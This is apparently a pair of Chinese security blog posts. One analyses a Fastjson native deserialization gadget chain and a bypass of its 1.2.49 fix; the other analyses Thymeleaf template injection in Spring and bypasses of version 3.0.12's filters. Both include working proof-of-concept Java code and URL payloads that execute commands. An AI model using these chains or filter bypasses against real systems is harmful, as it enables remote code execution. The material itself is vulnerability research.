[{"content":"0x00 前言 为了更好地总结和利用 Fastjson 相关漏洞，我之前编写过一款Fastjson扫描器（最后表示还是一坨hhh）。在模拟实际环境时，想到了这样一个场景：目标开放了JNDI、c3p0等反序列化入口，但没有合适的依赖或者依赖版本过高，能否继续利用？\n如果 JDK 较低，倒是可以打JDK原生链，可JDK稍高就束手无策了。正值烦恼之际，恰好看到了 Y4 师傅发布的文章 FastJson与原生反序列化 ，拜读后茅塞顿开，原来Fastjson 本身存在一条覆盖全版本的原生链，只要借着这条链子，上面的问题自然能够迎刃而解。\n0x01 原理分析 简单的写了一个CodeQL语句来查找实现 Serializable 接口和 readObject 方法的类\nimport java import semmle.code.java.dataflow.FlowSources import semmle.code.java.dataflow.TaintTracking2 import DataFlow2::PathGraph from SerializeClass c select c class SerializeClass extends Class { SerializeClass(){ exists(Class c | c.getASupertype*().hasQualifiedName(\u0026#34;java.io\u0026#34;, \u0026#34;Serializable\u0026#34;) and c.getAMethod().hasName(\u0026#34;readObject\u0026#34;) and c = this ) } } 只有一个类 AntiCollisionHashMap 满足要求\nAntiCollisionHashMap#putForCreate\nAntiCollisionHashMap 是一个 HashMap，在存储数据时必然会调用 hashCode()、equals() 等方法计算比对 key 的 hash 值\n联想到 JSONObject 也是个 Map，看一下 JSONObject 是如何应对 hashCode()、equals() 等计算场景的\n很可惜，这两个方法并没有特别之处。这时候面临两个选择，一是继续往下寻找有敏感方法调用的 hashCode()、equals() ，二是深挖 JSONObject 的利用点。（不过，小孩子才做选择题，大人当然是全都要hhh\n简单地搜索了一下Fastjson库中的 hashCode 方法\nimport java import semmle.code.java.dataflow.FlowSources import semmle.code.java.dataflow.TaintTracking2 import DataFlow2::PathGraph from SensitiveMethod m select m, m.getDeclaringType().getQualifiedName() class SensitiveMethod extends Method { SensitiveMethod(){ exists( Method m| (m.hasName(\u0026#34;hashCode\u0026#34;) or m.hasName(\u0026#34;equals\u0026#34;)) and m.getDeclaringType().getQualifiedName().indexOf(\u0026#34;com.alibaba.fastjson\u0026#34;) \u0026gt;= 0 and m = this ) } } 结果如下\n多出一个 ParameterizedTypeImpl，翻了一下并没有什么利用点，故此作罢\n重新看回到 JSONObject，发现 JSONObject 还实现了一个 invoke 方法\nJSONObject#invoke\n联系到之前分析过的 AnnotationInvocationHandler ，JDK原生链就是通过AnnotationInvocationHandler#invoke 方法触发的（invoke 方法会拦截代理实例，调用自身的 equalsImpl() 进行任意方法调用）\n那么 JSONObject 是否存在类似的利用路径呢？答案是肯定的（不过没必要用代理实例，JSONObject#toString 是public 修饰的，可以直接调用）\nJSONObject 的代理实例在调用 toString 方法时，会触发 JSON#toString 方法（ JSONObject 继承自 JSON ）\nJSON#toString\n学过 Fastjson 反序列化的应该知道，JSON#toString() 能够触发 getter 。具体流程不再赘述，相关调用栈如下\ncreateASMSerializer:91, SerializeConfig (com.alibaba.fastjson.serializer) createJavaBeanSerializer:223, SerializeConfig (com.alibaba.fastjson.serializer) createJavaBeanSerializer:113, SerializeConfig (com.alibaba.fastjson.serializer) getObjectWriter:664, SerializeConfig (com.alibaba.fastjson.serializer) getObjectWriter:403, SerializeConfig (com.alibaba.fastjson.serializer) getObjectWriter:359, JSONSerializer (com.alibaba.fastjson.serializer) write:247, MapSerializer (com.alibaba.fastjson.serializer) write:43, MapSerializer (com.alibaba.fastjson.serializer) write:278, JSONSerializer (com.alibaba.fastjson.serializer) toJSONString:827, JSON (com.alibaba.fastjson) toString:821, JSON (com.alibaba.fastjson) parseObject:420, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1318, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1284, DefaultJSONParser (com.alibaba.fastjson.parser) parse:152, JSON (com.alibaba.fastjson) parse:143, JSON (com.alibaba.fastjson) main:19, Any 进入 SerializeConfig#createASMSerializer 方法\n继续跟进 createJavaBeanSerializer()\nASMSerializerFactory#createJavaBeanSerializer\n\u0026hellip;\n利用ASM动态生成 ASMSerializer_1_Person\nASMSerializerFactory#generateWriteMethod\n遍历 getter 方法，根据返回类型选择对应处理方法。自定义的 getAge() 返回类型为 int，故而进入 _int()\nASMSerializerFactory#_get()\n此处利用 visitMethodInsn 方法调用对应的 getter，即 getAge()\n偶然间翻到之前生成的 ASMSerializer_1_BasicDataSource，倒是可以作为一个不错的参考\npublic void write(JSONSerializer var1, Object var2, Object var3, Type var4, int var5) throws IOException { SerializeWriter var9 = var1.out; if (!this.writeDirect(var1)) { this.writeNormal(var1, var2, var3, var4, var5); } else if (var9.isEnabled(32768)) { this.writeDirectNonContext(var1, var2, var3, var4, var5); } else { BasicDataSource var10 = (BasicDataSource)var2; if (!this.writeReference(var1, var2, var5)) { if (var9.isEnabled(2097152)) { this.writeAsArray(var1, var2, var3, var4, var5); } else { SerialContext var11 = var1.getContext(); var1.setContext(var11, var2, var3, 0); byte var12 = 123; String var6 = \u0026#34;abandonedLogWriter\u0026#34;; PrintWriter var13; ObjectSerializer var14; if (!var9.isEnabled(33554432)) { var13 = var10.getAbandonedLogWriter(); // 这里调用了 abandonedLogWriter 对应的 getter if (var13 == null) { if (var9.isEnabled(964)) { var9.write(var12); var9.writeFieldNameDirect(var6); var9.writeNull(0, 0); var12 = 44; } } ... 既然 JSONObject#toString 能够触发 getter，那一切就好办了，getter 可以选择 TemplatesImpl#getOutputProperties()进行恶意类加载\n接下来只需要找到一个能触发 toString 的 readObject 方法\nimport java from Call c where c.getCallee().hasName(\u0026#34;toString\u0026#34;) and c.getCaller().hasName(\u0026#34;readObject\u0026#34;) select c.getCaller(), c.getCaller().getDeclaringType().getQualifiedName() 查询结果如下\nBadAttributeValueExpException#readObject\nprivate void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(\u0026#34;val\u0026#34;, null); if (valObj == null) { val = null; } else if (valObj instanceof String) { val= valObj; } else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) { val = valObj.toString(); } else { // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + \u0026#34;@\u0026#34; + valObj.getClass().getName(); } } 因此整条链子就是\nBadAttributeValueExpException#readObject() -\u0026gt; JSONObject#toString() -\u0026gt; TemplatesImpl#getOutputProperties() 形成POC\nPOC import com.alibaba.fastjson.JSONObject; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.*; import javax.management.BadAttributeValueExpException; import java.io.*; import java.lang.reflect.Field; public class FastjsonUnserialize { public static void main(String[] args) throws CannotCompileException, NotFoundException, IOException, InstantiationException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException { String codes = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;);\u0026#34;; ClassPool pool = ClassPool.getDefault(); CtClass cc = pool.makeClass(\u0026#34;hhh\u0026#34;); cc.makeClassInitializer().insertBefore(codes); cc.setSuperclass((pool.get(AbstractTranslet.class.getName()))); byte[] bytecodes = cc.toBytecode(); TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameField = tc.getDeclaredField(\u0026#34;_name\u0026#34;); nameField.setAccessible(true); nameField.set(templates,\u0026#34;a\u0026#34;); Field bytecodesField = tc.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodesField.setAccessible(true); byte[][] bytes = new byte[][]{bytecodes}; bytecodesField.set(templates,bytes); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;aaa\u0026#34;, templates); Class\u0026lt;?\u0026gt; badClass = Class.forName(\u0026#34;javax.management.BadAttributeValueExpException\u0026#34;); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); Field valField = badClass.getDeclaredField(\u0026#34;val\u0026#34;); valField.setAccessible(true); valField.set(bad, jsonObject); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(bad); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readObject(); } } 0x02 Fastjson 1.2.49 bypass Fastjson1.2.49 及以后，JSONObject 实现了自己的反序列化逻辑\nprivate void readObject(final java.io.ObjectInputStream in) throws IOException, ClassNotFoundException { SecureObjectInputStream.ensureFields(); if (SecureObjectInputStream.fields != null \u0026amp;\u0026amp; !SecureObjectInputStream.fields_error) { ObjectInputStream secIn = new SecureObjectInputStream(in); try { secIn.defaultReadObject(); return; } catch (java.io.NotActiveException e) { // skip } } in.defaultReadObject(); for (Entry entry : map.entrySet()) { final Object key = entry.getKey(); if (key != null) { ParserConfig.global.checkAutoType(key.getClass()); } final Object value = entry.getValue(); if (value != null) { ParserConfig.global.checkAutoType(value.getClass()); } } } static class SecureObjectInputStream extends ObjectInputStream { static Field[] fields; static volatile boolean fields_error; static void ensureFields() { if (fields == null \u0026amp;\u0026amp; !fields_error) { try { final Field[] declaredFields = ObjectInputStream.class.getDeclaredFields(); String[] fieldnames = new String[]{\u0026#34;bin\u0026#34;, \u0026#34;passHandle\u0026#34;, \u0026#34;handles\u0026#34;, \u0026#34;curContext\u0026#34;}; Field[] array = new Field[fieldnames.length]; for (int i = 0; i \u0026lt; fieldnames.length; i++) { Field field = TypeUtils .getField(ObjectInputStream.class , fieldnames[i] , declaredFields ); field.setAccessible(true); array[i] = field; } fields = array; } catch (Throwable error) { fields_error = true; } } } public SecureObjectInputStream(ObjectInputStream in) throws IOException { super(in); try { for (int i = 0; i \u0026lt; fields.length; i++) { final Field field = fields[i]; final Object value = field.get(in); field.set(this, value); } } catch (IllegalAccessException e) { fields_error = true; } } protected Class\u0026lt;?\u0026gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { String name = desc.getName(); if (name.length() \u0026gt; 2) { int index = name.lastIndexOf(\u0026#39;[\u0026#39;); if (index != -1) { name = name.substring(index + 1); } if (name.length() \u0026gt; 2 \u0026amp;\u0026amp; name.charAt(0) == \u0026#39;L\u0026#39; \u0026amp;\u0026amp; name.charAt(name.length() - 1) == \u0026#39;;\u0026#39;) { name = name.substring(1, name.length() - 1); } ParserConfig.global.checkAutoType(name, null, Feature.SupportAutoType.mask); } return super.resolveClass(desc); } protected Class\u0026lt;?\u0026gt; resolveProxyClass(String[] interfaces) throws IOException, ClassNotFoundException { for (String interfacename : interfaces) { //检查是否处于黑名单 ParserConfig.global.checkAutoType(interfacename, null); } return super.resolveProxyClass(interfaces); } //Hack:默认构造方法会调用这个方法，重写此方法使用反射还原部分关键属性 protected void readStreamHeader() throws IOException, StreamCorruptedException { } } JSONObject 自定义了一个静态内部类 SecureObjectInputStream，当反序列化流程执行到 JSONObject 时就会触发 resolveClass 、resolveProxyClass 方法拦截恶意类。\n不过Fastjson 作为外部依赖，只能避免自己的类不被恶意利用，它的检测功能也必须在 JSONObject、JSONArray 被反序列化后才能启动，Fastjson 是无法防御在它之前的反序列化流程的\nObjectInputStream#readObject() -\u0026gt; OneClass#readObject() -\u0026gt; JSONObject#readObject() -\u0026gt; AnotherClass#readObject() // Fastjson 只能检测JSONObject及后续的Another 比如用户使用了 ObjectInputStream 等不安全的反序列化类，如果可以通过某些方式绕过 JSONObject 的 resolveClass 和 resolveProxyClass 检查，那 Fastjson 的修复就失效了\nByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(bad); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readObject(); 查阅 ObjectInputStream 的源码发现， resolveClass 和 resolveProxyClass 的 Caller 都是 readClassDesc\nresolveClass -\u0026gt; readNonProxyDesc -\u0026gt; readClassDesc resolveProxyClass -\u0026gt; readProxyDesc -\u0026gt; readClassDesc readClassDesc 的上级调用则是：\nreadClass readProxyDesc readNonProxyDesc readArray readEnum readOrdinaryObject ObjectInputStream#readObject0\ntry { switch (tc) { case TC_NULL: return readNull(); case TC_REFERENCE: return readHandle(unshared); case TC_CLASS: return readClass(unshared); case TC_CLASSDESC: case TC_PROXYCLASSDESC: return readClassDesc(unshared); case TC_STRING: case TC_LONGSTRING: return checkResolve(readString(unshared)); case TC_ARRAY: return checkResolve(readArray(unshared)); case TC_ENUM: return checkResolve(readEnum(unshared)); case TC_OBJECT: return checkResolve(readOrdinaryObject(unshared)); case TC_EXCEPTION: IOException ex = readFatalException(); throw new WriteAbortedException(\u0026#34;writing aborted\u0026#34;, ex); case TC_BLOCKDATA: case TC_BLOCKDATALONG: if (oldMode) { bin.setBlockDataMode(true); bin.peek(); // force header read throw new OptionalDataException( bin.currentBlockRemaining()); } else { throw new StreamCorruptedException( \u0026#34;unexpected block data\u0026#34;); } case TC_ENDBLOCKDATA: if (oldMode) { throw new OptionalDataException(true); } else { throw new StreamCorruptedException( \u0026#34;unexpected end of block data\u0026#34;); } default: throw new StreamCorruptedException( String.format(\u0026#34;invalid type code: %02X\u0026#34;, tc)); } 发现 TC_NULL、TC_REFERENCE、TC_LONGSTRING、TC_EXCEPTION、TC_BLOCKDATALONG、TC_ENDBLOCKDATA 不会调用 resolveClass 和 resolveProxyClass ，再经筛选，发现TC_REFERENCE 符合要求\nTC_REFERENCE 表示引用，利用分配的 newHandle 地址引用已完成反序列化的对象。之前学过的 JDK8u20链就是通过成员抛弃机制搭配 TC_REFERENCE 绕过 AnnocationInvocationHandler 的异常处理\n分析前面构造的链子\nBadAttributeValueExpException#readObject() -\u0026gt; JSONObject#toString() -\u0026gt; TemplatesImpl#getOutputProperties() SecureObjectInputStream#resolveClass、SecureObjectInputStream#resolveProxyClass 阻止的是 TemplatesImpl\n那我们可以先把 TemplatesImpl 反序列化出来，然后利用 TC_REFERENCE 将 TemplatesImpl 的引用地址插入到 JSONObject 的 value 值中，从而绕过拦截\n接下来寻找能够反序列化多个对象的存储类，很自然的想到HashMap，HashMap肯定会反序列化出key和value（前面的AntiCollisionHashMap 也不错，不过没HashMap 通用）\nprivate void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { // Read in the threshold (ignored), loadfactor, and any hidden stuff s.defaultReadObject(); reinitialize(); ... // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i \u0026lt; mappings; i++) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) K key = (K) s.readObject(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } } } POC import com.alibaba.fastjson.JSONObject; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.*; import javax.management.BadAttributeValueExpException; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; public class FastjsonUnserialize { public static void main(String[] args) throws CannotCompileException, NotFoundException, IOException, InstantiationException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException { String codes = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;);\u0026#34;; ClassPool pool = ClassPool.getDefault(); CtClass cc = pool.makeClass(\u0026#34;hhh\u0026#34;); cc.makeClassInitializer().insertBefore(codes); cc.setSuperclass((pool.get(AbstractTranslet.class.getName()))); byte[] bytecodes = cc.toBytecode(); TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameField = tc.getDeclaredField(\u0026#34;_name\u0026#34;); nameField.setAccessible(true); nameField.set(templates,\u0026#34;a\u0026#34;); Field bytecodesField = tc.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodesField.setAccessible(true); byte[][] bytes = new byte[][]{bytecodes}; bytecodesField.set(templates,bytes); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;aaa\u0026#34;, templates); // writeObject第二次写入templates, 由于是同一个对象, 因此使用 TC_REFERENCE 引用 templates 的 newHandle Class\u0026lt;?\u0026gt; badClass = Class.forName(\u0026#34;javax.management.BadAttributeValueExpException\u0026#34;); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); Field valField = badClass.getDeclaredField(\u0026#34;val\u0026#34;); valField.setAccessible(true); valField.set(bad, jsonObject); HashMap\u0026lt;Object, Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(templates, bad); // writeObject第一次写入templates ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(map); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readObject(); } } 0x03 后记 学习完Fastjson原生链，深刻地体会到什么叫没有绝对的安全。要想在业务中安全地实现反序列化，开发者绝不能期望组件能托管业务的全流程，完全依赖组件的安全特性，必须构建安全的SecureInputStream，从源头阻止恶意类被反序列化\nimport java.io.IOException; import java.io.InputStream; import java.io.ObjectInputStream; import java.io.ObjectStreamClass; public class SecureInputStream extends ObjectInputStream { @Override protected Class\u0026lt;?\u0026gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { // 可靠的 WAF return super.resolveClass(desc); } @Override protected Class\u0026lt;?\u0026gt; resolveProxyClass(String[] interfaces) throws IOException, ClassNotFoundException { // 可靠的 WAF return super.resolveProxyClass(interfaces); } } 安全的反序列化流程\n// ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); // ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); // objectOutputStream.writeObject(bad); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); SecureInputStream secureInputStream = new SecureInputStream(byteArrayInputStream); secureInputStream.readObject(); 附录 参考文献 FastJson与原生反序列化(二)\n版权信息 本文原载于0ZHan\u0026rsquo;s Blog，遵循CC BY-NC-SA 4.0协议，复制请保留原文出处。\n","date":"2024-05-21T11:35:06+08:00","permalink":"/p/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/","title":"Fastjson原生链"},{"content":"近期在审计XX管理系统时，挖到了一个 Thymeleaf 模板注入，借此机会分析一下此类漏洞产生的原理。\n0x00 前置知识 引用 Thymeleaf SSTI 分析以及最新版修复的 Bypass\n${...}：Variable Expressions（变量表达式）——通常在实际应用，一般是OGNL表达式或者是 SpEL，在Spring框架下使用SpEL表达式\n*{...}：Selection Variable Expressions （选择表达式）——类似于变量表达式，区别在于选择表达式是在当前选择的对象而不是整个上下文变量映射上执行。\n#{...}：Message Expressions（消息表达式）——允许从外部源（比如.properties文件）检索特定于语言环境的消息\n@{...}：Link URL Expressions（URL链接表达式）——允许许从外部源（比如.properties文件）检索特定于语言环境的消息\n~{...}：Fragment Expressions（片段表达式）Thymeleaf 3.x 版本新增的内容，分段段表达式是一种表示标记片段并将其移动到模板周围的简单方法。 正是由于这些表达式，片段可以被复制，或者作为参数传递给其他模板等等\n内联表达式 Expression inlining\nThymeleaf 3.1x 官方文档\n尽管标准语法允许我们使用标签属性执行几乎所有操作，但在某些情况下我们可能更喜欢将表达式直接写入 HTML 文本。例如，我们可能更喜欢这样写：\n\u0026lt;p\u0026gt;Hello, [[${session.user.name}]]!\u0026lt;/p\u0026gt; …而不是这个：\n\u0026lt;p\u0026gt;Hello, \u0026lt;span th:text=\u0026#34;${session.user.name}\u0026#34;\u0026gt;Sebastian\u0026lt;/span\u0026gt;!\u0026lt;/p\u0026gt; [[...]]或[(...)]在 Thymeleaf 中被视为内联表达式，我们可以使用任何在 th:text 或 th:utext 属性中也有效的表达式。\n请注意，[[...]] 对应于 th:text（即结果将进行 HTML 转义），而 [(...)] 对应于 th:utext，不会执行任何 HTML 转义。因此，对于变量 msg = 'This is \u0026lt;b\u0026gt;great!\u0026lt;/b\u0026gt;'，在给定这个片段的情况下：\n\u0026lt;p\u0026gt;The message is \u0026#34;[(${msg})]\u0026#34;\u0026lt;/p\u0026gt; 结果将不会对那些\u0026lt;b\u0026gt;标签进行转义，因此：\n\u0026lt;p\u0026gt;The message is \u0026#34;This is \u0026lt;b\u0026gt;great!\u0026lt;/b\u0026gt;\u0026#34;\u0026lt;/p\u0026gt; 而如果像这样写：\n\u0026lt;p\u0026gt;The message is \u0026#34;[[${msg}]]\u0026#34;\u0026lt;/p\u0026gt; 结果则会被 HTML 转义：\n\u0026lt;p\u0026gt;The message is \u0026#34;This is \u0026amp;lt;b\u0026amp;gt;great!\u0026amp;lt;/b\u0026amp;gt;\u0026#34;\u0026lt;/p\u0026gt; 请注意 默认情况下，在我们标记的每个标签的正文部分中都启用了文本内联，而不是标签本身，因此我们无需执行任何操作来启用它\n0x01 环境配置 和网上大多数文章一样，实验环境选择了 spring-view-manipulation\n运行环境并访问如下地址\nhttp://127.0.0.1:8090/path?lang=__%24%7Bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\u0026#34;calc\u0026#34;).getInputStream()).next()%7D__%3A%3A.x 弹出计算器~\n0x02 原理分析 SpringMVC 架构图\nDispatcherServlet#doDispatch\nDispatcherServlet 负责全局的流程控制，必然参与到视图渲染流程，因此对 doDispatch 方法断点分析\nDispatcherServlet 通过调用 HandlerAdapter （处理适配器），选择合适的 Controller 处理 request，跟进 ha.hadle 方法\nAbstractHandlerMethodAdapter#handle\nRequestMappingHandlerAdapter#handleInternal\nRequestMappingHandlerAdapter#invokeHandlerMethod\nServletInvocableHandlerMethod#invokeAndHandle\nreturnValue 即为 Controller 处理 request 返回的结果\nInvocableHandlerMethod#invokeForRequest\nInvocableHandlerMethod#doInvoke\n反射调用 HelloController 的 path 方法\nHelloController#path\n返回结果 returnValue 为 user/__${T(java.lang.Runtime).getRuntime().exec(\u0026quot;calc\u0026quot;)}__::.x/welcome\nServletInvocableHandlerMethod#invokeAndHandle\n获得 HelloController#path 返回结果后， invokeAndHandle 随即调用 returnValueHandlers.handleReturnValue 处理 returnValue\nHandlerMethodReturnValueHandlerComposite#handleReturnValue\nselectHandler 负责为 returnValue 选择合适的 Handler，处理 String 类型的是 ViewNameMethodReturnValueHandler\nViewNameMethodReturnValueHandler#handleReturnValue\nmavContainer将returnValue 添加到 viewName 属性中，并调用isRedirectViewName 检测 returnValues 是否包含 redirect: 字段，如果包含，则将 redirectModelScenario 值设为 true ，表示重定向\nRequestMappingHandlerAdapter#invokeHandlerMethod\n在执行完 invocableMethod.invokeAndHandle 方法后，RequestMappingHandlerAdapter 又调用 getModelAndView 方法创建 ModelAndView 对象。\nRequestMappingHandlerAdapter#getModelAndView\nDispatcherServlet#doDispatch\n获得 ModelAndView 对象后，DispatcherServlet 开始调用 processDispatchResult 处理返回结果\nDispatcherServle#processDispatchResult\n走解析视图的一般流程，进入 render 方法\nDispatcherServle#render\n这里会从 mv 获取 viewName，然后调用 resolveViewName 方法解析 viewName 获得 view （处理流程较为繁琐， view 是 ThymeleafView 类型） ，接着开始调用 view.render 解析视图\nThymeleafView#render\nThymeleafView#renderFragment\nrenderFragment 方法会检查 viewTemplateName （即之前的 returnValues），如果包含 ::，则会对其进行解析（因此我们的 payload 需要包含 ::），跟进后续的代码\nStandardExpressionParser#parseExpression\ninput 即为 ~{user/__${T(java.lang.Runtime).getRuntime().exec(\u0026quot;calc\u0026quot;)}__::.x/welcome}\npreprocess 表示是否需要调用 StandardExpressionPreprocessor.preprocess 处理 input\n此处传入的 preprocess 为 true ，代表需要处理 input，因此进入 StandardExpressionPreprocessor.preprocess\nStandardExpressionPreprocessor#preprocess\npreprocess 会先判断 input 是否存在 _，没有就不解析\n对 input 进行正则表达式匹配，匹配的内容为 \\\\_\\\\_(.*?)\\\\_\\\\_\nexpressionText 为匹配后的内容：${T(java.lang.Runtime).getRuntime().exec(\u0026quot;calc\u0026quot;)}\nStandardExpressionPreprocessor#preprocess\n执行完 StandardExpressionParser.parseExpression 后，开始解析 expressionText\nExpression#execute\nSimpleExpression#executeSimple\nVariableExpression#executeVariableExpression\nSPELVariableExpressionEvaluator#evalue\nSPELVariableExpressionEvaluator 实现了 IStandardVariableExpressionEvaluator 接口，另外一个实现类是 OGNLVariableExpressionEvaluator\n直到这步完成 SpEL 表达式解析\n0x03 Thymeleaf SSTI 修复方案分析 spring-view-manipulation 给出了三种修复方案，下面逐一分析无法触发的原因\n方案一：添加 @ResponseBody 注解 @GetMapping(\u0026#34;/safe/fragment\u0026#34;) @ResponseBody public String safeFragment(@RequestParam String section) { return \u0026#34;welcome :: \u0026#34; + section; } HandlerMethodReturnValueHandlerComposite#handleReturnValue\nHandlerMethodReturnValueHandlerComposite#selectHandler\nselectHandler 方法会根据 returnType 选择合适的 handler，由于设置了 @ResponseBody 注解，因此交给RequestResponseBodyMethodProcessor 处理 returnType\nRequestResponseBodyMethodProcessor#handleReturnValue\n该方法并不会为 ModelAndViewContainer 设置 viewName，且把 requestHandled 属性置为 true，所以不会创建ModelAndView 对象\n方案二：设置 redirect 重定向 @GetMapping(\u0026#34;/safe/redirect\u0026#34;) public String redirect(@RequestParam String url) { return \u0026#34;redirect:\u0026#34; + url; } DispatcherServlet#resolveViewName\n这里返回的是 RedirectView 对象，后续调用 RedirectView#render 方法，而不是 ThymeleafView#render，无法对其SpEL 解析\n方案三：请求参数添加 HttpServlerResponse 首先分析没有返回值也能触发 Thymeleaf SSTI 的原因\n@GetMapping(\u0026#34;/doc/{document}\u0026#34;) public void getDocument(@PathVariable String document) { log.info(\u0026#34;Retrieving \u0026#34; + document); } DispatcherServlet#doDispatch\n进入 addlyDefaultViewName 方法\nDispatcherServlet#applyDefaultViewName\ngetDocument 方法返回为空，DispatcherServlet 便调用 addlyDefaultViewName 方法为 ModelAndView 设置一个 defaultViewName\ndefaultViewName 是根据请求路径生成的，而当前路径为：\ndoc/__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\u0026quot;calc\u0026quot;).getInputStream()).next()}__::\n故而能够 SSTI\n对于请求参数设置了 HttpServletResponse 的情况\n@GetMapping(\u0026#34;/safe/doc/{document}\u0026#34;) public void getDocument(@PathVariable String document, HttpServletResponse response) { log.info(\u0026#34;Retrieving \u0026#34; + document); // return \u0026#34;Retrieving \u0026#34; + document 在有返回值的情况下, 即使设置了 response 也能触发 Thymeleaf SSTI } ServletInvocableHandlerMethod#invokeAndHandle\nInvocableHandlerMethod#invokeForRequest\n在调用 HelloController#getDocument 前，invokeForRequest 会先调用 getMethodArgumentValues 获取请求参数 args\nInvocableHandlerMethod#getMethodArgumentValues\n分别获取请求参数 String document 和 HttpServletResponse response\n随后调用 resolvers.resolveArgument 方法，解析 parameter\nHandlerMethodArgumentResolverComposite#resolveArgument\nHttpServletResponse 类型对应的 resolver 是 ServletResponseMethodArgumentResolver\nServletResponseMethodArgumentResolver#resolveArgument\n这里会将 ModelAndViewContainer 的 requestHandled 属性设置为 true，所以无法创建 ModelAndView 对象\n笔者挖掘的 SSTI 漏洞大致如下\n@GetMapping(\u0026#34;/path2\u0026#34;) // 这种情况即使添加了@ResponseBody 注解和 HttpServletResponse 也能触发 SSTI public ModelAndView path2(@RequestParam String p, HttpServletResponse response) { return new ModelAndView(p); } HandlerMethodReturnValueHandlerComposite#handleReturnValue\nhandleReturnValue 方法对于类型为 ModelAndView 的 returnType，将调用 ModelAndViewMethodReturnValueHandler处理结果\nModelAndViewMethodReturnValueHandler#handleReturnValue\nModelAndViewMethodReturnValueHandler 的 handleReturnValue 方法同样能给 ModelAndViewContainer 设置 viewName 属性，因此能触发 SSTI\n0x04 高版本 Bypass Thymeleaf 3.0.x \u0026lt;= Thymeleaf 3.0.12 SPELVariableExpressionEvaluator#evaluate\nThymeleaf 3.0.12 版本在 SPELVariableExpressionEvaluator#getExpression 方法做了如下修改\n新增了 SpringStandardExpressionUtils.containsSpELInstantiationOrStatic 方法校验 expression\n倒序扫描 exression ，如果检测到 new(空格) 或者 T( 就返回 true，表示该 expression 非法\nif (c == \u0026#39;)\u0026#39;) { si = n; } else if (si \u0026gt; n \u0026amp;\u0026amp; c == \u0026#39;(\u0026#39; \u0026amp;\u0026amp; ((n - 1 \u0026gt;= 0) \u0026amp;\u0026amp; (expression.charAt(n - 1) == \u0026#39;T\u0026#39;)) \u0026amp;\u0026amp; ((n - 1 == 0) || !Character.isJavaIdentifierPart(expression.charAt(n - 2)))) { return true; } else if (si \u0026gt; n \u0026amp;\u0026amp; !(Character.isJavaIdentifierPart(c) || c == \u0026#39;.\u0026#39;)) { si = -1; } 此处只能检测 T 紧邻( 的情况，即 T(，只要在T和(之间添加若干个空格字符，就能绕过检测了—— threedr3m 师傅\nPayload1\n__${T (java.lang.Runtime).getRuntime().exec(\u0026#39;calc\u0026#39;)}__::.x 访问触发 SSTI\nhttp://127.0.0.1:8090/path?lang=__%24%7BT%20(java.lang.Runtime).getRuntime().exec(%22calc%22)%7D__%3A%3A.x 还有一种方法，绕过new xxx 的检测：利用点号 . （来自2024 RWCTF wp）\npayload2\n__${new.java..lang.ProcessBuilder(\u0026#34;calc\u0026#34;).start()}__::.x 此外，Thymeleaf 3.0.12 还新增了一个 SpringRequestUtils 类\nThymeleafView\nSpringRequestUtils#checkViewNameNotInRequest\n检查请求路径 requestURI 是否能控制视图名viewName ，用于防御以下情景下的SSTI\n@GetMapping(\u0026#34;/samepath/{path}\u0026#34;) public String samePath(@PathVariable String path) { return \u0026#34;samepath/ \u0026#34; + path; } 